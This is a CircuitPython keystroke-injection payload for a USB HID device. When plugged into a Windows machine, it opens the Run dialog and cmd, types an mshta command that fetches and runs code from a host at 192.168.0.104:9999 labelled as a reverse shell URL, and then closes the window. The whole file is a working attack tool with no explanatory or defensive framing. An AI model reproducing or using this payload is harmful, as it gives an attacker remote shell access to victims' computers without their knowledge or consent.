import time
import os
import usb_hid
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

ReverseShellURL = "http://192.168.0.104:9999/LmhHS"
time.sleep(3)

if not 'run' in os.listdir():
    time.sleep(10)
    keyboard = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(keyboard)

    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(1)
    layout.write("cmd\n")
    time.sleep(2)
    layout.write(f"mshta {ReverseShellURL}\n")
    time.sleep(3)
    keyboard.send(Keycode.ALT, Keycode.F4)
